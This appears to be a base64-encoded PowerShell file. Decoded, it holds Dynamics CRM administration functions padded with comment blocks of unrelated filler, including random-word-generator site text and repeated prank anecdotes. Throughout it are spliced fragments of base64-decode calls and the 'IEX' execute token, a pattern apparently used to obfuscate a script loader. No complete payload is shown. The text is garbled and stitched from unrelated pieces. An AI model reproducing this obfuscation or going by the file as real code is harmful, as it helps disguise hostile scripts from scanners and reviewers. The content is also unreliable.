KE1hbmRhdG9yeT0kZmFsc2UpXQogICAgICAgIFtib29sXSRVc2VTa3lwZVByb3RvY29sLAoJCVtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSldCgkJW2Jvb2xdJFVzZUFsbG93VXNlcnNTZWVBcHBkb3dubG9hZE1lc3NhZ2UsCgkJW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV0KCQlbc3RyaW5nXSREZWZhdWx0Q3JtQ3VzdG9tTmFtZSwKCQlbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXQoJCVtib29sXSRTdXBwcmVzc1NMQSwKCQlbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXQoJCVtib29sXSRJc0F1ZGl0RW5hYmxlZCwKCQlbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXQoJCVtib29sXSRBbGxvd0xlZ2FjeUNsaWVudEV4cGVyaWVuY2UKICAgICkKCgkkY29ubiA9IFZlcmlmeUNybUNvbm5lY3Rpb25QYXJhbSAtY29ubiAkY29ubiAtcGlwZWxpbmVWYWx1ZSAoJFBTQm91bmRQYXJhbWV0ZXJzLkNvbnRhaW5zS2V5KCdjb25uJykpCiAgICAKICAgICR1cGRhdGVGaWVsZHMgPSBAe30KCiAgICAkYXR0cmlidXRlc01ldGFkYXRhID0gR2V0LUNybUVudGl0eUF0dHJpYnV0ZXMgLWNvbm4gJGNvbm4gLUVudGl0eUxvZ2ljYWxOYW1lIG9yZ2FuaXphdGlvbgogICAgICAgIAogICAgJGRlZmF1bHRFbWFpbFNldHRpbmdzID0gQHt9ICAgICAgICAKCiAgICBmb3JlYWNoKCRwYXJhbWV0ZXIgaW4gJE15SW52b2NhdGlvbi5Cb3VuZFBhcmFtZXRlcnMuR2V0RW51bWVyYXRvcigpKQogICAgeyAgIAogICAgICAgICRhdHRyaWJ1dGVNZXRhZGF0YSA9ICRhdHRyaWJ1dGVzTWV0YWRhdGEgfCA/IHskXy5TY2hlbWFOYW1lIC1lcSAkcGFyYW1ldGVyLktleX0KCiAgICAgICAgaWYoJHBhcmFtZXRlci5LZXkgLWluICgiSW5jb21pbmdFbWFpbERlbGl2ZXJ5TWV0aG9kIiwiT3V0Z29pbmdFbWFpbERlbGl2ZXJ5TWV0aG9kIiwiQUNURGVsaXZlcnlNZXRob2QiKSkKICAgICAgICB7CiAgICAgICAgICAgICRkZWZhdWx0RW1haWxTZXR0aW5ncy5BZGQoJHBhcmFtZXRlci5LZXksJHBhcmFtZXRlci5WYWx1ZSkKICAgICAgICB9CiAgICAgICAgZWxzZWlmKCRhdHRyaWJ1dGVNZXRhZGF0YSAtZXEgJG51bGwpCiAgICAgICAgewogICAgICAgICAgICBjb250aW51ZQogICAgICAgIH0KICAgICAgICBlbHNlaWYoJGF0dHJpYnV0ZU1ldGFkYXRhLkF0dHJpYnV0ZVR5cGUgLWVxICJQaWNrbGlzdCIpCiAgICAgICAgewogICAgICAgICAgICAkdXBkYXRlRmllbGRzLkFkZCgkcGFyYW1ldGVyLktleS5Ub0xvd2VyKCksIChOZXctQ3JtT3B0aW9uU2V0VmFsdWUgJHBhcmFtZXRlci5WYWx1ZSkpCiAgICAgICAgfQogICAgICAgIGVsc2VpZigkYXR0cmlidXRlTWV0YWRhdGEuQXR0cmlidXRlVHlwZSAtZXEgIkxvb2t1cCIpCiAgICAgICAgewogICAgICAgICAgICAkdXBkYXRlRmllbGRzLkFkZCgkcGFyYW1ldGVyLktleS5Ub0xvd2VyKCksIChOZXctQ3JtRW50aXR5UmVmZXJlbmNlIGVtYWlsc2VydmVycHJvZmlsZSAkcGFyYW1ldGVyLlZhbHVlKSkKICAgICAgICB9CiAgICAgICAgZWxzZQogICAgICAgIHsKICAgICAgICAgICAgJHVwZGF0ZUZpZWxkcy5BZGQoJHBhcmFtZXRlci5LZXkuVG9Mb3dlcigpLCAkcGFyYW1ldGVyLlZhbHVlKQogICAgICAgIH0KICAgIH0KICAgIAogICAgJGZldGNoID0gQCIKICAgIDxmZXRjaCB2ZXJzaW9uPSIxLjAiIG91dHB1dC1mb3JtYXQ9InhtbC1wbGF0Zm9ybSIgbWFwcGluZz0ibG9naWNhbCIgZGlzdGluY3Q9ImZhbHNlIiBuby1sb2NrPSJ0cnVlIj4KICAgICAgICA8ZW50aXR5IG5hbWU9Im9yZ2FuaXphdGlvbiI+CiAgICAgICAgICAgIDxhdHRyaWJ1dGUgbmFtZT0ib3JnYW5pemF0aW9uaWQiIC8+CiAgICAgICAgICAgIDxhdHRyaWJ1dGUgbmFtZT0iZGVmYXVsdGVtYWlsc2V0dGluZ3MiIC8+CiAgICAgICAgPC9lbnRpdHk+CiAgICA8L2ZldGNoPgoiQAoKICAgICRzeXN0ZW1TZXR0aW5ncyA9IChHZXQtQ3JtUmVjb3Jkc0J5RmV0Y2ggLWNvbm4gJGNvbm4gLUZldGNoICRmZXRjaCkuQ3JtUmVjb3Jkc1swXQogICAgJHJlY29yZGlkID0gJHN5c3RlbVNldHRpbmdzLm9yZ2FuaXphdGlvbmlkCgogICAgaWYoJGRlZmF1bHRFbWFpbFNldHRpbmdzLkNvdW50IC1uZSAwKQogICAgeyAgICAgICAgCiAgICAgICAgJGVtYWlsU2V0dGluZ3MgPSBbeG1sXSRzeXN0ZW1TZXR0aW5ncy5kZWZhdWx0ZW1haWxzZXR0aW5ncwogICAgICAgIGlmKCRkZWZhdWx0RW1haWxTZXR0aW5ncy5Db250YWluc0tleSgiSW5jb21pbmdFbWFpbERlbGl2ZXJ5TWV0aG9kIikpCiAgICAgICAgewogICAgICAgICAgICAkZW1haWxTZXR0aW5ncy5FbWFpbFNldHRpbmdzLkluY29taW5nRW1haWxEZWxpdmVyeU1ldGhvZCA9IFtzdHJpbmddJGRlZmF1bHRFbWFpbFNldHRpbmdzWyJJbmNvbWluZ0VtYWlsRGVsaXZlcnlNZXRob2QiXQogICAgICAgIH0KICAgICAgICBpZigkZGVmYXVsdEVtYWlsU2V0dGluZ3MuQ29udGFpbnNLZXkoIk91dGdvaW5nRW1haWxEZWxpdmVyeU1ldGhvZCIpKQogICAgICAgIHsKICAgICAgICAgICAgJGVtYWlsU2V0dGluZ3MuRW1haWxTZXR0aW5ncy5PdXRnb2luZ0VtYWlsRGVsaXZlcnlNZXRob2QgPSBbc3RyaW5nXSRkZWZhdWx0RW1haWxTZXR0aW5nc1siT3V0Z29pbmdFbWFpbERlbGl2ZXJ5TWV0aG9kIl0KICAgICAgICB9CiAgICAgICAgaWYoJGRlZmF1bHRFbWFpbFNldHRpbmdzLkNvbnRhaW5zS2V5KCJBQ1REZWxpdmVyeU1ldGhvZCIpKQogICAgICAgIHsKICAgICAgICAgICAgJGVtYWlsU2V0dGluZ3MuRW1haWxTZXR0aW5ncy5BQ1REZWxpdmVyeU1ldGhvZCA9IFtzdHJpbmddJGRlZmF1bHRFbWFpbFNldHRpbmdzWyJBQ1REZWxpdmVyeU1ldGhvZCJdCiAgICAgICAgfQoKICAgICAgICAkdXBkYXRlRmllbGRzLkFkZCgiZGVmYXVsdGVtYWlsc2V0dGluZ3MiLCRlbWFpbFNldHRpbmdzLk91dGVyWG1sKQogICAgfQoKICAgIFNldC1Dcm1SZWNvcmQgLWNvbm4gJGNvbm4gLUVudGl0eUxvZ2ljYWxOYW1lIG9yZ2FuaXphdGlvbiAtSWQgJHJlY29yZGlkIC1GaWVsZHMgJHVwZGF0ZUZpZWxkcwp9CjwjPj4KU3A9ZWxsaW5nIGFuZCBkKCkKVGhpcyB0b29sIGNhbiBiZSBhbiBleGNlbGxlbnQgd2F5IHRvIGltcHJvdmUgZCgpIG9yIHByYWN0aWNlIGZvciByKCkgYmVlcy4gSWYgYW4gcSgpIHdvcmQgbygpLCBwKCkgdXAgdGhlIG1lYW5pbmcgd2lsbCBoZWxwIHN0dWRlbnRzIGluY3JlYXNlIHRoZSBudW1iZXIgb2Ygd29yZHMgdGhleSBrbm93LiBXb3JraW5nIHdpdGggYSBwYXJ0bmVyLCBzdHVkZW50cyBjYW4gdGVzdCBlYWNoIG90aGVyIG9uIHRoZSByKCkgZm9yIHRoZSByYW5kb21pemVkIHdvcmRzIG0oKWQuCgpOYW1lIEluc3BpcmF0aW9uCklmIHlvdSBuZWVkIHRvIGNyZWF0ZSBhIG5hbWUgZm9yIGEgcHJvZHVjdCwgYW4gZXZlbnQsIGEgYmFuZCBvciBmb3IgYW55dGhpbmcgZWxzZSwgdGhpcyB0b29sIGNhbiBiZSBxdWl0ZSBoZWxwZnVsLiBBcyB5b3UgY29uc2lkZXIgbmFtZXMsIG0oKSBhIG51bWJlciBvZiByYW5kb20gd29yZHMgYW5kIHNlZSBob3cgdGhleSBpbXBhY3Qgd2hhdCB5b3UgaGF2ZSBhbHJlYWR5IGNvbWUgdXAgd2l0aC4gSW5wdXR0aW5nIHVuaXF1ZSB3b3JkcyB5b3UgbWF5IG5vdCBoYXZlIGNvbnNpZGVyZWQgY2FuIHNwYXJrIGFkZGl0aW9uYWwgY3JlYXRpdml0eSB0byBldmVudHVhbGx5IGhlbHAgeW91IHByb2R1Y2UgdGhlIHBlcmZlY3QgbmFtZSBmb3IgeW91ciBwcm9qZWN0LiBJZiB5b3UncmUgcCgpIGZvciBnb29kIGNoYXJhY3RlciBuYW1lcyBvciBiYWJ5IG5hbWVzLCB5b3UgbWlnaHQgYmUgaW50ZXJlc3RlZCBpbiBvdXIgcmFuZG9tIG5hbWUgZ2VuZXJhdG9yLgoKVGhlIGFib3ZlIGxpc3QgaXMgbm90IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoLiBUaGVyZSBhcmUgbGl0ZXJhbGx5IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoIG9mIHdheXMgdGhlIFJhbmRvbSBXb3JkIEdlbmVyYXRvciBjYW4gYmUgdXNlZC4gUGxlYXNlIGZlZWwgZnJlZSB0byBzaGFyZSB0aGUgd2F5IHlvdSB1c2UgdGhpcyB0b29sLCBhbmQgd2UgYWx3YXlzIHdlbGNvbWUgc3VnZ2VzdGlvbnMgb24gaG93IHdlIGNhbiBpbXByb3ZlIGl0IHRvIHNlcnZlIHlvdSBiZXR0ZXIuIFdlIGFyZSBhbHNvIGludGVyZXN0ZWQgaW4gbmV3IHdvcmQgZ2VuZXJhdG9ycyB5b3UnZCBiZSBpbnRlcmVzdGVkIGluIHVzIGNyZWF0aW5nLiBNYW55IG9mIHRoZSB0b29scyBvbiB0aGlzIHdlYnNpdGUgY2FtZSBmcm9tIGlkZWFzIGZyb20gcGVvcGxlIGxpa2UgeW91IHdobyBjb250YWN0ZWQgdXMuIFBsZWFzZSB0YWtlIHRoZSB0aW1lIHRvIGV4cGxvcmUgdGhlIG90aGVyIHJhbmRvbSBnZW5lcmF0b3JzIHdlIGhhdmUgYXZhaWwKCiM+PCM+4oCcVGhpcyBvbmUgdGltZSBpbiA5dGggZ3JhZGUsIG15IGZyaWVuZCBhbmQgSSBkZWNpZGVkIHRvIHVzZSB0aGUgcmVzdHJvb20gSUVYIGEgYmlnIHRlc3QuIEkgZGlkbnQgZ2l2ZSBhIHNodCBhYm91dCB0aGlzIHRlc3QsIHNvIEkgcGxheWZ1bGx5IHByZXRlbmRlZCB0byBnZXQgcmVhbGx5IHVwc2V0LiBJbiBhdHRlbXB0IHRvIGJlIG9idmlvdXNseSBub3QgbWFkLCBJIGtpY2sgYSBwaXBlIG9uIHRoZSB0b3Agb2YgYSB1cmluYWwsIGFjY2lkZW50YWxseSBrbm9ja2luZyBpdCBvdXQgb2YgdGhlIHRvcCBvZiB0aGUgdG9pbGV0LiBJdCB3YXMgc3RpbGwgY29ubmVjdGVkIHRvIHRoZSB3YWxsIGhvd2V2ZXIuIFR1cm5zIG91dCwgSSBjb3VsZCBhaW0gdGhlIHBpcGUgaW4gZGlmZmVyZW50IGRpcmVjdGlvbnMuIFNvLCBJIGFpbWVkIGl0IHN0cmFpZ2h0IG91dCBhbmQgdHJpZWQgZmx1c2hpbmcgdGhlIHRvaWxldC4gVGhlIHdhdGVyIExBVU5DSEVEIE9VVCBPRiBUSEUgUElQRSBBTkQgSElUIFRIRSBXQUxMIE9OIFRIRSBPVEhFUiBTSURFIE9GIFRIRSBST09NLiBNeSBmcmllbmQgYW5kIEkgd2VyZSBmbGlwcGluZyBvdXQuIFRoaXMgZ2F2ZSBtZSBhIGJyaWdodCBpZGVhLiBJIHB1dCB0aGUgcGlwZSBpbiBzdWNoIGEgc3BvdCB3aGVyZSBpdCBsb29rZWQgbGlrZSBpdCB3YXMgcHJpb3IgdG8gdXMga2lja2luZyB0aGUgZiprIG91dCBvZiBpdC4gSG93ZXZlciwgSSBwdWxsZWQgaXQgb3V0IGV2ZXIgc28gc2xpZ2h0bHkgc28gd2F0ZXIgd291bGQgc3ByYXkgb3VyIG5leHQgdW5zdXNwZWN0aW5nIHZpY3RpbS4gSSByZW1lbWJlciBraWRzIGNvbWluZyBvdXQgb2YgdGhlIGJhdGhyb29tIGRyZW5jaGVkIGluIHdhdGVyLCBjdXNzaW5nIHRoZWlyIGJyYWlucyBvdXQgYmVjYXVzZSB0aGV5IHdlcmUgc28gbWFkLiBHb29kIHRpbWVzLuKAnSM+CjwjPuKAnFRoaXMgb25lIHRpbWUgaW4gOXRoIGdyYWRlLCBteSBmcmllbmQgYW5kIEkgZGVjaWRlZCB0byB1c2UgdGhlIHJlc3Ryb29tIElFWCBhIGJpZyB0ZXN0LiBJIGRpZG50IGdpdmUgYSBzaHQgYWJvdXQgdGhpcyB0ZXN0LCBzbyBJIHBsYXlmdWxseSBwcmV0ZW5kZWQgdG8gZ2V0IHJlYWxseSB1cHNldC4gSW4gYXR0ZW1wdCB0byBiZSBvYnZpb3VzbHkgbm90IG1hZCwgSSBraWNrIGEgcGlwZSBvbiB0aGUgdG9wIG9mIGEgdXJpbmFsLCBhY2NpZGVudGFsbHkga25vY2tpbmcgaXQgb3V0IG9mIHRoZSB0b3Agb2YgdGhlIHRvaWxldC4gSXQgd2FzIHN0aWxsIGNvbm5lY3RlZCB0byB0aGUgd2FsbCBob3dldmVyLiBUdXJucyBvdXQsIEkgY291bGQgYWltIHRoZSBwaXBlIGluIGRpZmZlcmVudCBkaXJlY3Rpb25zLiBTbywgSSBhaW1lZCBpdCBzdHJhaWdodCBvdXQgYW5kIHRyaWVkIGZsdXNoaW5nIHRoZSB0b2lsZXQuIFRoZSB3YXRlciBMQVVOQ0hFRCBPVVQgT0YgVEhFIFBJUEUgQU5EIEhJVCBUSEUgV0FMTCBPTiBUSEUgT1RIRVIgU0lERSBPRiBUSEUgUk9PTS4gTXkgZnJpZW5kIGFuZCBJIHdlcmUgZmxpcHBpbmcgb3V0LiBUaGlzIGdhdmUgbWUgYSBicmlnaHQgaWRlYS4gSSBwdXQgdGhlIHBpcGUgaW4gc3VjaCBhIHNwb3Qgd2hlcmUgaXQgbG9va2VkIGxpa2UgaXQgd2FzIHByaW9yIHRvIHVzIGtpY2tpbmcgdGhlIGYqayBvdXQgb2YgaXQuIEhvd2V2ZXIsIEkgcHVsbGVkIGl0IG91dCBldmVyIHNvIHNsaWdodGx5IHNvIHdhdGVyIHdvdWxkIHNwcmF5IG91ciBuZXh0IHVuc3VzcGVjdGluZyB2aWN0aW0uIEkgcmVtZW1iZXIga2lkcyBjb21pbmcgb3V0IG9mIHRoZSBiYXRocm9vbSBkcmVuY2hlZCBpbiB3YXRlciwgY3Vzc2luZyB0aGVpciBicmFpbnMgb3V0IGJlY2F1c2UgdGhleSB3ZXJlIHNvIG1hZC4gR29vZCB0aW1lcy7igJ0jPgo8Iz7igJxJIHdhcyBhdCBhIHN3YW5rIGJhciBmb3IgYSB3b3JrIFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoLCBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCBzb21lIGdyYWQgc3R1ZGVudHMgd2UgaigpIGZvciBhbiBmKCkgcHJvZ3JhbS4gQWZ0ZXIgd2UgaGFkIGFsbCBoYWQgaygpIGRyaW5rcywgb25lIG9mIHRoZSBzdHVkZW50cyBzYWlkIHRoZXkgZG9udCBsaWtlIHNtb2tlcyBiZWNhdXNlIHRoZXkgdGFzdGUgbGlrZSBhLiBNeSBib3NzIHJlcGxpZWQsIG1heWJlIHlvdSBoYXZlbnQgaGFkIGdvb2Qgc21va2VzLiBTbyBJIGN1dCBpbiwgbWF5YmUgeW91IGhhdmVudCBoYWQgZ29vZCBhLiBJIHdhcyBhc2tlZCB0byBsZWF2ZS7igJ1Tb3VyY2UjPgo8I1RoYXRzIERlZGljYXRpb25Tb3VyY2UgT25lIHRpbWUgSSBhdGUgMjYgY2hvY29sYXRlIGNoaXAgaSgpIGJlY2F1c2UgSSB3YXMgbWFkIGF0IG15IGxpdHRsZSBsKCkgYW5kIGRpZG50IHdhbnQgaGVyIHRvIGhhdmUgYW55LiBJIHB1a2VkIGFsbCBvdmVyIHRoZSBwbGFjZS7igJ0gU291cmNlIz4KPCPigJxUaGlzIG9uZSB0aW1lIGluIDl0aCBncmFkZSwgbXkgZnJpZW5kIGFuZCBJIGRlY2lkZWQgdG8gdXNlIHRoZSByZXN0cm9vbSBJRVggYSBiaWcgdGVzdC4gSSBkaWRudCBnaXZlIGEgc2h0IGFib3V0IHRoaXMgdGVzdCwgc28gSSBwbGF5ZnVsbHkgcHJldGVuZGVkIHRvIGdldCByZWFsbHkgdXBzZXQuIEluIGF0dGVtcHQgdG8gYmUgb2J2aW91c2x5IG5vdCBtYWQsIEkga2ljayBhIHBpcGUgb24gdGhlIHRvcCBvZiBhIHVyaW5hbCwgYWNjaWRlbnRhbGx5IGtub2NraW5nIGl0IG91dCBvZiB0aGUgdG9wIG9mIHRoZSB0b2lsZXQuIEl0IHdhcyBzdGlsbCBjb25uZWN0ZWQgdG8gdGhlIHdhbGwgaG93ZXZlci4gVHVybnMgb3V0LCBJIGNvdWxkIGFpbSB0aGUgcGlwZSBpbiBkaWZmZXJlbnQgZGlyZWN0aW9ucy4gU28sIEkgYWltZWQgaXQgc3RyYWlnaHQgb3V0IGFuZCB0cmllZCBmbHVzaGluZyB0aGUgdG9pbGV0LiBUaGUgd2F0ZXIgTEFVTkNIRUQgT1VUIE9GIFRIRSBQSVBFIEFORCBISVQgVEhFIFdBTEwgT04gVEhFIE9USEVSIFNJREUgT0YgVEhFIFJPT00uIE15IGZyaWVuZCBhbmQgSSB3ZXJlIGZsaXBwaW5nIG91dC4gVGhpcyBnYXZlIG1lIGEgYnJpZ2h0IGlkZWEuIEkgcHV0IHRoZSBwaXBlIGluIHN1Y2ggYSBzcG90IHdoZXJlIGl0IGxvb2tlZCBsaWtlIGl0IHdhcyBwcmlvciB0byB1cyBraWNraW5nIHRoZSBmKmsgb3V0IG9mIGl0LiBIb3dldmVyLCBJIHB1bGxlZCBpdCBvdXQgZXZlciBzbyBzbGlnaHRseSBzbyB3YXRlciB3b3VsZCBzcHJheSBvdXIgbmV4dCB1bnN1c3BlY3RpbmcgdmljdGltLiBJIHJlbWVtYmVyIGtpZHMgY29taW5nIG91dCBvZiB0aGUgYmF0aHJvb20gZHJlbmNoZWQgaW4gd2F0ZXIsIGN1c3NpbmcgdGhlaXIgYnJhaW5zIG91dCBiZWNhdXNlIHRoZXkgd2VyZSBzbyBtYWQuIEdvb2QgdGltZXMu4oCdIz4KZnVuY3Rpb24gMTl7CgogW0NtZGxldEJpbmRpbmcoKV0KICAgIFBBUkFNKCAKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXQogICAgICAgIFtNaWNyb3NvZnQuWHJtLlRvb2xpbmcuQ29ubmVjdG9yLkNybVNlcnZpY2VDbGllbnRdJGNvbm4sCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JHRydWUsIFBvc2l0aW9uPTEpXQogICAgICAgIFtndWlkXSRVc2VySWQsCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JHRydWUsIFBvc2l0aW9uPTIpXQogICAgICAgIFtndWlkXSRCdXNpbmVzc1VuaXRJZCwKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UsIFBvc2l0aW9uPTMpXQogICAgICAgIFtndWlkXSRSZWFzc2lnblVzZXJJZAogICAgKQoKCSRjb25uID0gVmVyaWZ5Q3JtQ29ubmVjdGlvblBhcmFtIC1jb25uICRjb25uIC1waXBlbGluZVZhbHVlICgkUFNCb3VuZFBhcmFtZXRlcnMuQ29udGFpbnNLZXkoJ2Nvbm4nKSkKCgkjIElmIFJlYXNzaWduVXNlcklkIGlzIG5vdCBwYXNzZWQsIHRoZW4gYXNzaWduIHRoZW0gdG8gbXlzZWxmICAKCWlmKCRSZWFzc2lnblVzZXJJZCAtZXEgJG51bGwpICAKCXsgIAoJCSRSZWFzc2lnblVzZXJJZCA9ICRVc2VySWQgIAoJfSAgCgogICAgJFJlYXNzaWduUHJpbmNpcGFsID0gTmV3LUNybUVudGl0eVJlZmVyZW5jZSAtRW50aXR5TG9naWNhbE5hbWUgc3lzdGVtdXNlciAtSWQgJFJlYXNzaWduVXNlcklkCgogICAgJHJlcXVlc3QgPSBOZXctT2JqZWN0ICdNaWNyb3NvZnQuQ3JtLlNkay5NZXNzYWdlcy5TZXRCdXNpbmVzc1N5c3RlbVVzZXJSZXF1ZXN0JwogICAgJHJlcXVlc3QuQnVzaW5lc3NJZCA9ICRCdXNpbmVzc1VuaXRJZAogICAgJHJlcXVlc3QuVXNlcklkID0gJFVzZXJJZAogICAgJHJlcXVlc3QuUmVhc3NpZ25QcmluY2lwYWwgPSAkUmVhc3NpZ25QcmluY2lwYWwKCiAgICB0cnkKICAgIHsKICAgICAgICAkcmVzdWx0ID0gJGNvbm4uRXhlY3V0ZUNybU9yZ2FuaXphdGlvblJlcXVlc3QoJHJlcXVlc3QsICRudWxsKQoJCWlmKCRyZXN1bHQgLWVxICRudWxsKQogICAgICAgIHsKICAgICAgICAgICAgdGhyb3cgTGFzdENybUNvbm5lY3RvckV4Y2VwdGlvbigkY29ubikKICAgICAgICB9CiAgICB9CiAgICBjYXRjaAogICAgewogICAgICAgIHRocm93IExhc3RDcm1Db25uZWN0b3JFeGNlcHRpb24oJGNvbm4pCiAgICB9Cn0KPCM+PgpTcD1lbGxpbmcgYW5kIGQoKQpUaGlzIHRvb2wgY2FuIGJlIGFuIGV4Y2VsbGVudCB3YXkgdG8gaW1wcm92ZSBkKCkgb3IgcHJhY3RpY2UgZm9yIHIoKSBiZWVzLiBJZiBhbiBxKCkgd29yZCBvKCksIHAoKSB1cCB0aGUgbWVhbmluZyB3aWxsIGhlbHAgc3R1ZGVudHMgaW5jcmVhc2UgdGhlIG51bWJlciBvZiB3b3JkcyB0aGV5IGtub3cuIFdvcmtpbmcgd2l0aCBhIHBhcnRuZXIsIHN0dWRlbnRzIGNhbiB0ZXN0IGVhY2ggb3RoZXIgb24gdGhlIHIoKSBmb3IgdGhlIHJhbmRvbWl6ZWQgd29yZHMgbSgpZC4KCk5hbWUgSW5zcGlyYXRpb24KSWYgeW91IG5lZWQgdG8gY3JlYXRlIGEgbmFtZSBmb3IgYSBwcm9kdWN0LCBhbiBldmVudCwgYSBiYW5kIG9yIGZvciBhbnl0aGluZyBlbHNlLCB0aGlzIHRvb2wgY2FuIGJlIHF1aXRlIGhlbHBmdWwuIEFzIHlvdSBjb25zaWRlciBuYW1lcywgbSgpIGEgbnVtYmVyIG9mIHJhbmRvbSB3b3JkcyBhbmQgc2VlIGhvdyB0aGV5IGltcGFjdCB3aGF0IHlvdSBoYXZlIGFscmVhZHkgY29tZSB1cCB3aXRoLiBJbnB1dHRpbmcgdW5pcXVlIHdvcmRzIHlvdSBtYXkgbm90IGhhdmUgY29uc2lkZXJlZCBjYW4gc3BhcmsgYWRkaXRpb25hbCBjcmVhdGl2aXR5IHRvIGV2ZW50dWFsbHkgaGVscCB5b3UgcHJvZHVjZSB0aGUgcGVyZmVjdCBuYW1lIGZvciB5b3VyIHByb2plY3QuIElmIHlvdSdyZSBwKCkgZm9yIGdvb2QgY2hhcmFjdGVyIG5hbWVzIG9yIGJhYnkgbmFtZXMsIHlvdSBtaWdodCBiZSBpbnRlcmVzdGVkIGluIG91ciByYW5kb20gbmFtZSBnZW5lcmF0b3IuCgpUaGUgYWJvdmUgbGlzdCBpcyBub3QgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZyguIFRoZXJlIGFyZSBsaXRlcmFsbHkgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZyggb2Ygd2F5cyB0aGUgUmFuZG9tIFdvcmQgR2VuZXJhdG9yIGNhbiBiZSB1c2VkLiBQbGVhc2UgZmVlbCBmcmVlIHRvIHNoYXJlIHRoZSB3YXkgeW91IHVzZSB0aGlzIHRvb2wsIGFuZCB3ZSBhbHdheXMgd2VsY29tZSBzdWdnZXN0aW9ucyBvbiBob3cgd2UgY2FuIGltcHJvdmUgaXQgdG8gc2VydmUgeW91IGJldHRlci4gV2UgYXJlIGFsc28gaW50ZXJlc3RlZCBpbiBuZXcgd29yZCBnZW5lcmF0b3JzIHlvdSdkIGJlIGludGVyZXN0ZWQgaW4gdXMgY3JlYXRpbmcuIE1hbnkgb2YgdGhlIHRvb2xzIG9uIHRoaXMgd2Vic2l0ZSBjYW1lIGZyb20gaWRlYXMgZnJvbSBwZW9wbGUgbGlrZSB5b3Ugd2hvIGNvbnRhY3RlZCB1cy4gUGxlYXNlIHRha2UgdGhlIHRpbWUgdG8gZXhwbG9yZSB0aGUgb3RoZXIgcmFuZG9tIGdlbmVyYXRvcnMgd2UgaGF2ZSBhdmFpbAoKIz48Iz7igJxUaGlzIG9uZSB0aW1lIGluIDl0aCBncmFkZSwgbXkgZnJpZW5kIGFuZCBJIGRlY2lkZWQgdG8gdXNlIHRoZSByZXN0cm9vbSBJRVggYSBiaWcgdGVzdC4gSSBkaWRudCBnaXZlIGEgc2h0IGFib3V0IHRoaXMgdGVzdCwgc28gSSBwbGF5ZnVsbHkgcHJldGVuZGVkIHRvIGdldCByZWFsbHkgdXBzZXQuIEluIGF0dGVtcHQgdG8gYmUgb2J2aW91c2x5IG5vdCBtYWQsIEkga2ljayBhIHBpcGUgb24gdGhlIHRvcCBvZiBhIHVyaW5hbCwgYWNjaWRlbnRhbGx5IGtub2NraW5nIGl0IG91dCBvZiB0aGUgdG9wIG9mIHRoZSB0b2lsZXQuIEl0IHdhcyBzdGlsbCBjb25uZWN0ZWQgdG8gdGhlIHdhbGwgaG93ZXZlci4gVHVybnMgb3V0LCBJIGNvdWxkIGFpbSB0aGUgcGlwZSBpbiBkaWZmZXJlbnQgZGlyZWN0aW9ucy4gU28sIEkgYWltZWQgaXQgc3RyYWlnaHQgb3V0IGFuZCB0cmllZCBmbHVzaGluZyB0aGUgdG9pbGV0LiBUaGUgd2F0ZXIgTEFVTkNIRUQgT1VUIE9GIFRIRSBQSVBFIEFORCBISVQgVEhFIFdBTEwgT04gVEhFIE9USEVSIFNJREUgT0YgVEhFIFJPT00uIE15IGZyaWVuZCBhbmQgSSB3ZXJlIGZsaXBwaW5nIG91dC4gVGhpcyBnYXZlIG1lIGEgYnJpZ2h0IGlkZWEuIEkgcHV0IHRoZSBwaXBlIGluIHN1Y2ggYSBzcG90IHdoZXJlIGl0IGxvb2tlZCBsaWtlIGl0IHdhcyBwcmlvciB0byB1cyBraWNraW5nIHRoZSBmKmsgb3V0IG9mIGl0LiBIb3dldmVyLCBJIHB1bGxlZCBpdCBvdXQgZXZlciBzbyBzbGlnaHRseSBzbyB3YXRlciB3b3VsZCBzcHJheSBvdXIgbmV4dCB1bnN1c3BlY3RpbmcgdmljdGltLiBJIHJlbWVtYmVyIGtpZHMgY29taW5nIG91dCBvZiB0aGUgYmF0aHJvb20gZHJlbmNoZWQgaW4gd2F0ZXIsIGN1c3NpbmcgdGhlaXIgYnJhaW5zIG91dCBiZWNhdXNlIHRoZXkgd2VyZSBzbyBtYWQuIEdvb2QgdGltZXMu4oCdIz4KPCM+4oCcVGhpcyBvbmUgdGltZSBpbiA5dGggZ3JhZGUsIG15IGZyaWVuZCBhbmQgSSBkZWNpZGVkIHRvIHVzZSB0aGUgcmVzdHJvb20gSUVYIGEgYmlnIHRlc3QuIEkgZGlkbnQgZ2l2ZSBhIHNodCBhYm91dCB0aGlzIHRlc3QsIHNvIEkgcGxheWZ1bGx5IHByZXRlbmRlZCB0byBnZXQgcmVhbGx5IHVwc2V0LiBJbiBhdHRlbXB0IHRvIGJlIG9idmlvdXNseSBub3QgbWFkLCBJIGtpY2sgYSBwaXBlIG9uIHRoZSB0b3Agb2YgYSB1cmluYWwsIGFjY2lkZW50YWxseSBrbm9ja2luZyBpdCBvdXQgb2YgdGhlIHRvcCBvZiB0aGUgdG9pbGV0LiBJdCB3YXMgc3RpbGwgY29ubmVjdGVkIHRvIHRoZSB3YWxsIGhvd2V2ZXIuIFR1cm5zIG91dCw